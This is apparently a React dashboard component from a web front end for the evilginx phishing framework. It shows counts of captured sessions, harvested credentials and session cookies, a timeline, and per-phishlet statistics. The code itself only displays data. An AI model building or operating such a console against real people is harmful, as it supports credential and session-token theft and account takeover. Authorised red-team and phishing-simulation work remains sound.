import { useEffect, useState, useCallback } from 'react'
import { Activity, Crosshair, KeyRound, Cookie } from 'lucide-react'
import { api } from '../api'
import { useLiveEvent } from '../live'
import { Card, Spinner, Badge } from '../ui'

function Stat({ label, value, sub, Icon, color }) {
  return (
    <Card className="p-5">
      <div className="flex items-center justify-between">
        <div className="text-xs uppercase tracking-wide text-[var(--text-dim)]">{label}</div>
        {Icon && <Icon size={18} style={{ color: color || 'var(--text-dim)' }} />}
      </div>
      <div className="mt-2 text-3xl font-bold" style={{ color: color || 'var(--text)' }}>{value}</div>
      {sub && <div className="mt-1 text-xs text-[var(--text-dim)]">{sub}</div>}
    </Card>
  )
}

export default function Dashboard() {
  const [stats, setStats] = useState(null)
  const [cfg, setCfg] = useState(null)
  const [err, setErr] = useState('')

  const loadStats = useCallback(() => {
    api.stats().then(setStats).catch((e) => setErr(e.message))
  }, [])

  useEffect(() => {
    loadStats()
    api.config().then(setCfg).catch((e) => setErr(e.message))
  }, [loadStats])

  // live: refresh counters/timeline when new sessions are captured
  useLiveEvent('sessions', () => loadStats())

  if (err) return <div className="rounded-lg bg-[var(--danger-weak)] px-4 py-3 text-[var(--danger)]">{err}</div>
  if (!stats) return <Spinner />

  const maxTimeline = Math.max(1, ...stats.timeline.map((t) => t.count))
  const phishlets = Object.entries(stats.per_phishlet || {}).sort((a, b) => b[1] - a[1])

  return (
    <div>
      <h1 className="mb-1 text-2xl font-bold text-[var(--text)]">Dashboard</h1>
      <p className="mb-6 text-sm text-[var(--text-dim)]">
        {cfg?.general?.domain ? <>Base domain <span className="text-[var(--text-muted)]">{cfg.general.domain}</span> · </> : null}
        evilginx {cfg?.version}
      </p>

      <div className="grid grid-cols-2 gap-4 lg:grid-cols-4">
        <Stat label="Total Sessions" value={stats.total_sessions} Icon={Activity} />
        <Stat label="Captured" value={stats.captured_sessions} Icon={Crosshair} color="var(--accent)" sub="creds or tokens harvested" />
        <Stat label="With Credentials" value={stats.with_credentials} Icon={KeyRound} color="var(--info)" />
        <Stat label="With Cookies" value={stats.with_cookies} Icon={Cookie} color="var(--warn)" sub="full session tokens" />
      </div>

      <div className="mt-4 grid grid-cols-1 gap-4 lg:grid-cols-3">
        <Card className="p-5 lg:col-span-2">
          <div className="mb-4 text-sm font-semibold text-[var(--text)]">New sessions (14 days)</div>
          <div className="flex h-40 items-end gap-1.5">
            {stats.timeline.map((t) => (
              <div key={t.date} className="group relative flex flex-1 flex-col items-center justify-end">
                <div
                  className="w-full rounded-t bg-[var(--accent)] transition-all group-hover:bg-[var(--accent-strong)]"
                  style={{ height: `${(t.count / maxTimeline) * 100}%`, minHeight: t.count ? '4px' : '0' }}
                />
                <div className="absolute -top-6 hidden rounded bg-[var(--surface-2)] px-1.5 py-0.5 text-xs text-[var(--text)] group-hover:block">{t.count}</div>
                <div className="mt-1 text-[9px] text-[var(--text-dim)]">{t.date.slice(5)}</div>
              </div>
            ))}
          </div>
        </Card>

        <Card className="p-5">
          <div className="mb-3 flex items-center justify-between">
            <div className="text-sm font-semibold text-[var(--text)]">Phishlets</div>
            <Badge color="green">{stats.phishlets_enabled} enabled</Badge>
          </div>
          <div className="space-y-2">
            {phishlets.length === 0 && <div className="text-sm text-[var(--text-dim)]">No sessions yet.</div>}
            {phishlets.slice(0, 8).map(([name, count]) => (
              <div key={name} className="flex items-center justify-between text-sm">
                <span className="text-[var(--text-muted)]">{name}</span>
                <span className="font-mono text-[var(--text-dim)]">{count}</span>
              </div>
            ))}
          </div>
          <div className="mt-4 border-t border-[var(--border)] pt-3 text-xs text-[var(--text-dim)]">
            {stats.lures} lures · {stats.phishlets_total} phishlets loaded
          </div>
        </Card>
      </div>
    </div>
  )
}
